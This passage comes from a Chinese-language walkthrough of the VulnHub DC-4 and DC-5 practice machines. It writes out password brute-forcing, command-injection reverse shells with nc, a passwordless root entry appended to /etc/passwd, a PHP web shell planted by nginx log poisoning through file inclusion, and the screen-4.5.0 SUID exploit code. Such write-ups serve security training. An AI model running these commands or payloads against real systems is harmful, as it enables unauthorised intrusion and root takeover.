<p>成功进入<code>shell</code></p>
<p>但是当执行提权时</p>
<p><img src="/2022/08/29/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></p>
<p>报错无法提权，看来是被过滤啥的</p>
<hr>
<h1 id="四、DC-4-初级"><a href="#四、DC-4-初级" class="headerlink" title="四、DC-4[初级]"></a>四、DC-4[初级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>先看看靶机端口运行的服务</p>
<p><img src="/2022/08/29/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></p>
<p>发现有<code>22</code>和<code>80</code>端口，分别运行<code>ssh</code>和<code>http</code></p>
<p>我们先访问<code>80</code>端口</p>
<blockquote>
<p>访问ip：<code>192.168.133.141</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></p>
<p>是一个基本的登录窗口，有提示是<code>admin</code>用户登录界面，所以<strong>可能需要密码爆破登录</strong></p>
<p>我们再利用<code>wappalyzer</code>看一下网站一些基本信息</p>
<p><img src="/2022/08/29/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></p>
<p>没有啥有用的信息</p>
<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>然后我们就开始进行密码爆破</p>
<p>已知用户名为<code>admin</code>，只用对密码爆破</p>
<p><img src="/2022/08/29/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></p>
<p>【字典可以自己找，当然也可以看我学习笔记写的网站下载】</p>
<p>这里我用的<code>top2000.txt</code></p>
<p>最后爆破出密码为<code>happy</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></p>
<p>登录试试</p>
<p><img src="/2022/08/29/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></p>
<p>登录成功，进入<code>Command</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></p>
<p>点击<code>run</code>，就会显示上面的数据，看来是命令执行，但是它默认是<code>ls -l</code>，我们试试抓包能修改请求包里的命令吗</p>
<p><img src="/2022/08/29/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></p>
<p>发现是可以修改的，我们试试<code>whoami</code>命令，看看当前网站登录用户权限</p>
<blockquote>
<p>输入<code>whoami</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></p>
<p>发现是普通用户权限</p>
<p>下面是两个<code>getshell</code>的思路</p>
<hr>
<p><strong>1.</strong></p>
<p>后续查询操作，因为我们可以执行命令，所以也可以利用<code>nc</code><strong>反弹shell</strong>，同样也可以找到用户目录信息</p>
<blockquote>
<p>终端输入<code>nc -l -vv -p 8888</code>，监听8888端口</p>
</blockquote>
<p>抓包数据命令修改为</p>
<blockquote>
<p><code>nc -nv 192.168.133.140 8888 -e /bin/bash</code>   &#x2F;&#x2F;<code>192.168.133.140</code>是虚拟机ip，不是靶机ip</p>
</blockquote>
<p>然后终端就可以执行后续执行命令的类似操作，就是执行的时候可能稍微方便一些</p>
<hr>
<p><strong>2.</strong></p>
<p>我们修改命令，查询<code>/etc/passwd</code>文档（记录每个用户的信息，方便管理员对用户的管理的一个文档）</p>
<blockquote>
<p>输入<code>cat+/etc/passwd</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></p>
<p>发现有三个用户</p>
<blockquote>
<p><code>charles</code><br><code>jim</code><br><code>sam</code></p>
</blockquote>
<p>我们查看这几个用户的目录下有没有我们需要的信息</p>
<p>先访问<code>charles</code></p>
<blockquote>
<p>输入<code>ls+-a+/home/charles</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></p>
<p>感觉没啥有用的信息</p>
<p>再看看<code>jim</code></p>
<blockquote>
<p>输入<code>ls+-a+/home/jim</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></p>
<p>发现关键信息， <code>backups</code>目录和<code>mbox</code>目录，<code>test.sh</code>里面我看了，没啥有用的信息</p>
<p>先看<code>backups</code>目录</p>
<blockquote>
<p>输入<code>ls+-a+/home/jim/backups</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></p>
<p>发现有个<code>old-passwords.bak</code>，这个可能就是登录这三个用户的关键</p>
<p>查看一下内容</p>
<blockquote>
<p>输入<code>cat+/home/jim/old-passwords.bak</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></p>
<p>发现是一个密码表，复制到一个文本文件，当作爆破的密码表</p>
<h2 id="hydra对三用户进行ssh爆破"><a href="#hydra对三用户进行ssh爆破" class="headerlink" title="hydra对三用户进行ssh爆破"></a>hydra对三用户进行ssh爆破</h2><p>我们已经有了密码表<code>（pd.txt）</code>,我们再把三个用户名写到另一个文档里<code>（un.txt）</code></p>
<p>因为之前我们扫描知道，<code>22</code>端口运行着<code>ssh</code>，而<code>80</code>端口我们已经访问了，所以下面端口写<code>22</code></p>
<p>于是</p>
<blockquote>
<p>输入<code>hydra -L un.txt -P pd.txt 192.168.133.141 ssh -s 22</code></p>
</blockquote>
<p>有点久，等一会就行</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></p>
<p>得到<code>jim</code>用户的密码</p>
<blockquote>
<p><code>jibril04</code></p>
</blockquote>
<p>然后我们登录<code>ssh</code></p>
<blockquote>
<p>输入<code>ssh jim@192.168.133.141 -p 22</code></p>
</blockquote>
<p>然后输入密码后，登录成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></p>
<p>我们先看看我们能否执行一些管理员命令</p>
<blockquote>
<p>输入<code>sudo -l</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></p>
<p>发现<code>jim</code>用户不能执行任何管理员命令，所以不可能在<code>jim</code>用户上进行提权或其他后续操作</p>
<p>我们仔细一些可以看到</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></p>
<p>说我们有一封邮件，那我们就看看这封用邮件是什么</p>
<p>但我们不知道<code>mail</code>在哪里</p>
<blockquote>
<p>输入<code>find / -name mail</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></p>
<p>找到位置<code>/var/mail</code></p>
<blockquote>
<p>输入<code>cd /var/mail;ls -a</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></p>
<p>发现有一封名为<code>jim</code>的邮件，查看信息</p>
<blockquote>
<p>输入<code>cat jim</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></p>
<p>发现是<code>charles</code>发给<code>jim</code>的邮件</p>
<blockquote>
<p><code>Hi Jim,</code></p>
<p><code>I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</code></p>
<p><code>Password is:  ^xHhA&amp;hvim0y</code></p>
<p><code>See ya,</code><br><code>Charles</code></p>
<p>翻译：<br>嗨，吉姆，</p>
<p>我今天年底要放假，所以老板让我把密码给你，以防万一。</p>
<p>密码是：^xHhA&amp;hvim0y</p>
<p>再见，<br>查尔斯</p>
</blockquote>
<p>信里提到他自己的密码</p>
<blockquote>
<p><code>^xHhA&amp;hvim0y</code></p>
</blockquote>
<p>于是我们就可以登录<code>charles</code>的账号，所以我们切换用户</p>
<blockquote>
<p>输入<code>su charles</code></p>
</blockquote>
<p>然后输入密码后，登录成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></p>
<p>先看看<code>charles</code>能执行什么管理员命令</p>
<blockquote>
<p>输入<code>sudo -l</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></p>
<p>发现<code>charles</code>可以执行管理员的<code>teehee</code>命令</p>
<h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>我们先需要知道这个命令是干什么的</p>
<blockquote>
<p>输入<code>teehee -h</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></p>
<p><u><strong>发现它是可以修改文件的数据，-a指令能够保证修改文件不会覆盖原有文件</strong></u></p>
<p>那我们需要管理员权限，就可以在<code>/etc/passwd</code>里面添加一个管理员用户数据</p>
<h3 id="添加管理员账户"><a href="#添加管理员账户" class="headerlink" title="添加管理员账户"></a>添加管理员账户</h3><blockquote>
<p>输入<code>sudo teehee -a /etc/passwd</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></p>
<p>然后就等待我们输入数据</p>
<p><img src="/2022/08/29/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></p>
<p>按照<code>root</code>用户格式，我们添加自己的数据</p>
<blockquote>
<p>输入<br><code>ttoc:</code>(这里是密码，可以加入自己的哈希后的密码，当然不加就可以直接登录，这里我不加，忽略)<code>:0:0:root:/root:/bin/bash</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></p>
<p>添加成功，我们再看看能不能登录，是不是管理员</p>
<p><img src="/2022/08/29/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></p>
<p>发现是管理员，直接到<code>root</code>目录下，查看 <code>flag</code>即可</p>
<p><img src="/2022/08/29/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是<br>恭喜！！！</p>
<p>希望你喜欢 DC-4。只是想向所有这些人表示衷心的感谢<br>谁提供了反馈，谁花时间完成了这些小事<br>挑战。</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="五、DC-5-高级"><a href="#五、DC-5-高级" class="headerlink" title="五、DC-5[高级]"></a>五、DC-5[高级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h2><p>官方文档里有一些提示说明，我们可以先看一下</p>
<blockquote>
<p><code>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide soKme kind of idea as to what the vulnerability might involve.</code></p>
<p><code>And just for the record, there is no phpmailer exploit involved. :-)</code><br>翻译：<br>据我所知，只有一个可利用的入口点可以进入（也没有 SSH）。这个特定的入口点可能很难识别，但它就在那里。您需要寻找一些与众不同的东西（随着页面的刷新而改变的东西）。这有望为漏洞可能涉及的内容提供某种想法。</p>
<p>只是为了记录，没有涉及 phpmailer 漏洞利用。:-)</p>
<p>&#x3D;&#x3D;&gt;大致关键的信息就是，在我们刷新网页的时候有的东西会发生改变，对应某种漏洞</p>
</blockquote>
<p>养成习惯，先顺手用<code>nmap</code>扫一下靶机端口运行的服务信息</p>
<p><img src="/2022/08/29/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></p>
<p>发现<code>80</code>端口正常运行着<code>http</code>，<code>54235</code>端口打开</p>
<hr>
<p>我们访问<code>192.168.133.143</code></p>
<p>先习惯看看<code>Wappalyzer</code>基本信息</p>
<p><img src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>发现<code>Web server</code>是<code>Nginx</code></p>
<p>发现有5个窗口</p>
<p><img src="/2022/08/29/vulnhub/image-20220930190329914.png" alt="image-20220930190329914"></p>
<p>挨个访问，看看有没有可以利用或者交互的地方</p>
<p><img src="/2022/08/29/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></p>
<p><img src="/2022/08/29/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></p>
<p>发现<code>Concat</code>窗口下有个输入框，可以实现交互效果，我们乱输入一些数据先试试</p>
<p>看看变化</p>
<p><img src="/2022/08/29/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></p>
<p>发现<code>url</code>在提交时发生的跳转，并且显示了一些信息</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>看得出来，网站跳转到了<code>thankyou.php</code>，而且我们输入的信息也被以明文方式显示出来了</p>
<p>那怎么利用呢？</p>
<p>我们想起之前作者给的提示，说<strong>刷新的时候会发生变化</strong>，我们刷新看看</p>
<p><img src="/2022/08/29/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></p>
<p><img src="/2022/08/29/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></p>
<p>对比两个图可以发现，底下的年份时间发生了改变，<strong>刷新一次，增加一年</strong></p>
<p>这个肯定是有用的，但是怎么利用还是不知道</p>
<p>我们先要了解这个变化肯定是有文件来调用的，而我们肯定是可以访问这个文件的，那我们就需要再次针对性的进行信息收集</p>
<p>用经典的<code>dirsearch</code>来扫一下</p>
<p><img src="/2022/08/29/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></p>
<p>除去我们已经访问过的文件和响应码403的，发现有一个叫做<code>footer.php</code>文件，刚好和我们的发现变化的那个地方一致，也是<code>底部文本</code>变化</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/footer.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></p>
<p>发现果然是我们发现变化的那个地方，而且我们刷新时，也会同时变化</p>
<hr>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>所以按上面我们推到的思路，和信息的收集，</p>
<p><code>concat.php</code>的底部为了显示和<code>footer.php</code>的实现功能，肯定是实现了文件包含，</p>
<p><code>concat.php</code>把<code>footer.php</code>文件包含了</p>
<p>&#x3D;&#x3D;&gt;我们渗透的基础思路就变成了<strong>利用的文件包含   拿到shell</strong></p>
<h3 id="1-验证我们的想法"><a href="#1-验证我们的想法" class="headerlink" title="1.验证我们的想法"></a>1.验证我们的想法</h3><p>【文件包含注入点可控参数名一般为<code>file</code>，当然如果出现怎么都不行的，那就可以用<code>爆破</code>**(fuzz)**或者我们的思路错误了】</p>
<p>我们先试试能不能包含<code>index.php</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/thankyou.php?file=index.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></p>
<p>发现<code>index.php</code>确实被我们成功包含了，那我们就可以肯定我们的思路是没有偏离了</p>
<h3 id="2-利用文件包含拿shell"><a href="#2-利用文件包含拿shell" class="headerlink" title="2.利用文件包含拿shell"></a>2.利用文件包含拿shell</h3><p>既然能够在<code>thank.php</code>里实现文件包含，那我们就试试能不能包含一些敏感文件，来获取更多信息</p>
<h4 id="1）向Nginx错误日志导入一句话🐎"><a href="#1）向Nginx错误日志导入一句话🐎" class="headerlink" title="1）向Nginx错误日志导入一句话🐎"></a>1）向Nginx错误日志导入一句话🐎</h4><p>根据我们之前收集的信息，</p>
<p><img src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>发现<code>Web server</code>是<code>Nginx</code></p>
<blockquote>
<p>Nginx访问日志：网站访问者有关的活动都记录在访问日志 &#x2F;&#x2F;<code>access_log</code></p>
<p>Nginx错误日志：当访问错误的时候，会把错误参数保存在其中  &#x2F;&#x2F;<code>error_log</code></p>
</blockquote>
<p>所以我们在我们的</p>
<blockquote>
<p><code>url/?file=</code> 的后面加上一句话🐎，<br>然后因为访问错误，错误参数【一句话🐎】就会到<code>nginx的错误日志</code>中，<br>然后利用我们发现的文件包含把错误日记包含在<code>thankyou.php</code>文件中，<br>访问拿到<code>shell</code>，拿到<code>shell</code></p>
</blockquote>
<p><em><code>nginx</code>配置文件位置：</em><em>&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</em>*</p>
<p>我们包含该文件看看<strong>nginx的错误日志文件</strong>位置在哪里</p>
<p><img src="/2022/08/29/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></p>
<p>看到文件位置</p>
<blockquote>
<p><code>error_log：/var/log/nginx/error.log</code></p>
</blockquote>
<p>先输入一句话🐎，报错导入<code>nginx</code>错误日志</p>
<hr>
<p><strong>key</strong>：如果直接在网页输入一句话🐎导入错误日志是有问题的</p>
<blockquote>
<p>当我们访问<code>http://192.168.133.143/thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
<p>虽然确实把这个信息导入到了 <code>/var/log/nginx/error.log</code> 文件里</p>
<p>但是前端似乎存在过滤，会把&lt;&gt;和’’或””，替换成其他符号，所以当我们想要利用</p>
<p><code>http://192.168.133.143/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code></p>
<p>这样想利用我们导入的木马拿到shell的时候，实际上我们的木马已经被破坏了，所以根本不能执行我们想要的一系列命令，所以用抓包burp直接发送到服务器，绕过前端过滤先，这样我们的一句话🐎才能发挥它的作用</p>
</blockquote>
<hr>
<p>所以我们执行<strong>抓包操作</strong></p>
<p><img src="/2022/08/29/vulnhub/image-20221001221200987.png" alt="image-20221001221200987"></p>
<p>没有其他回显内容</p>
<p><img src="/2022/08/29/vulnhub/image-20221001221849004.png" alt="image-20221001221849004"></p>
<p>我们在文件包含<code>/var/log/nginx/error.log</code>，并利用<code>cmd</code>参数执行<code>ls</code>试试，看看是否真的把我们的木马包含进去了</p>
<p><img src="/2022/08/29/vulnhub/image-20221001222035413.png" alt="image-20221001222035413"></p>
<p>发现确实成功包含进去了，而且还可以执行命令</p>
<p>那我们直接用<code>nc</code>命令反弹<code>shell</code></p>
<h4 id="2）nc命令反弹shell"><a href="#2）nc命令反弹shell" class="headerlink" title="2）nc命令反弹shell"></a>2）nc命令反弹shell</h4><p>先在<code>kali</code>控制台执行<code>nc</code>监听<code>8888</code>端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -vv -p <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221001223417288.png" alt="image-20221001223417288"></p>
<p>然后网页浏览</p>
<blockquote>
<p><code>http://192.168.133.144/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/bin/bash</code></p>
<p>&#x2F;&#x2F;<code>192.168.133.140</code>是虚拟机ip，不是靶机ip</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221001223100801.png" alt="image-20221001223100801"></p>
<p>返回控制台查看</p>
<p><img src="/2022/08/29/vulnhub/image-20221001223320410.png" alt="image-20221001223320410"></p>
<p>进入<code>shell</code></p>
<p>然后标准姿势，进入交互式shell</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221001223408282.png" alt="image-20221001223408282"></p>
<h4 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="*获得稳定的shell"></a>*获得稳定的shell</h4><p>【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】</p>
<blockquote>
<p>先在shell，用<code>Ctrl-Z</code>将shell放到后台</p>
<p>再<br><code>stty raw -echo ; fg ; reset</code>  </p>
<p><code>nc -l -vv -p 8888</code>  &#x2F;&#x2F;这个不用输入，是自动执行后台的命令返回到前台</p>
<p>&#x2F;&#x2F;stty 设置终端端口设备的接口选项</p>
<p>&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls</p>
<p>&#x2F;&#x2F;fg把shell提到前台来</p>
<p>&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221002145951718.png" alt="image-20221002145951718"></p>
<p>成功获得全交互式<code>shell</code></p>
<h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><p>拿到shell以后，我们权限明显是不够的，所以我们需要<strong>垂直提权</strong>，拿到最高权限</p>
<p>先看看存不存在<code>suid</code>方式提权</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221001223927542.png" alt="image-20221001223927542"></p>
<p>似乎没啥可以利用提权的点，但是有个</p>
<p><img src="/2022/08/29/vulnhub/image-20221001224134569.png" alt="image-20221001224134569"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>screen-<span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>看起来有点陌生，我们<code>百度/google</code>就要利用起来了</p>
<blockquote>
<p><code>GNU Screen</code>是一款由<code>GNU</code>计划开发的用于命令行终端切换的自由软件。</p>
<p>用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。</p>
<p><code>GNU Screen</code>可以看作是窗口管理器的命令行界面版本。</p>
<p>它提供了统一的管理多个会话的界面和相应的功能。</p>
</blockquote>
<p>看来是属于suid当中的漏洞脚本提权，那脚本怎么找呢</p>
<h4 id="1）searchsploit找提权脚本文件"><a href="#1）searchsploit找提权脚本文件" class="headerlink" title="1）searchsploit找提权脚本文件"></a>1）searchsploit找提权脚本文件</h4><p>我们可以使用<code>searchsploit</code>搜索软件相关漏洞有没有可以利用的脚本，而且它的版本号也写出来了</p>
<p><img src="/2022/08/29/vulnhub/image-20221001224602898.png" alt="image-20221001224602898"></p>
<p>发现有两个文件，一个<code>sh脚本</code>文件，一个<code>txt文本</code>的（POC）</p>
<p>看到有<code>sh脚本</code>文件路径，先查看其内容是什么，看看能不能利用</p>
<p><img src="/2022/08/29/vulnhub/image-20221001224718080.png" alt="image-20221001224718080"></p>
<p>发现是个<code>c语言脚本</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221001224923228.png" alt="image-20221001224923228"></p>
<p>看来我们找的是正确的，我们分析一下该脚本文件，看看怎么利用其来提权</p>
<blockquote>
<p>仔细看其实这里面有两个C语言脚本</p>
<p>【<code>EOF</code>为文结束符号】</p>
<p>而且需要保存到两个c文件中去<br><code>libhax.c</code><br><code>rootshell.c</code></p>
<p>然后用gcc命令<br><code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code><br><code>gcc -o /tmp/rootshell /tmp/rootshell.c</code></p>
<p>对两个c文件进行编译，从而生成<br><code>libhax.so</code><br><code>rootshell</code></p>
<p>然后在把两个c文件和两个编译后生成的文件传入靶机后</p>
<p>在靶机shell挨个执行后面的命令，从而拿到root权限</p>
<p><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</code><br><code>cd /etc</code><br><code>umask 000 # because</code><br><code>screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</code><br><code>echo &quot;[+] Triggering...&quot;</code><br><code>screen -ls # screen itself is setuid, so... /tmp/rootshell</code>                            </p>
</blockquote>
<p>上半部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221002124640256.png" alt="image-20221002124640256"></p>
<p>下半部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221002124701995.png" alt="image-20221002124701995"></p>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<p>我们需要在靶机的&#x2F;tmp目录下，传入</p>
<blockquote>
<p><code>libhax.so</code><br><code>rootshell</code><br><code>flag.sh</code>   &#x2F;&#x2F;内容为后面的命令内容</p>
</blockquote>
<p>这三个文件</p>
<p>我们先在自己的<code>kali</code>机上把这两个文件准备好</p>
<p>我们也可以先到我们<code>kali</code>机的<code>/tmp</code>目录下</p>
<p>先执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221002124843966.png" alt="image-20221002124843966"></p>
<p>再执行</p>
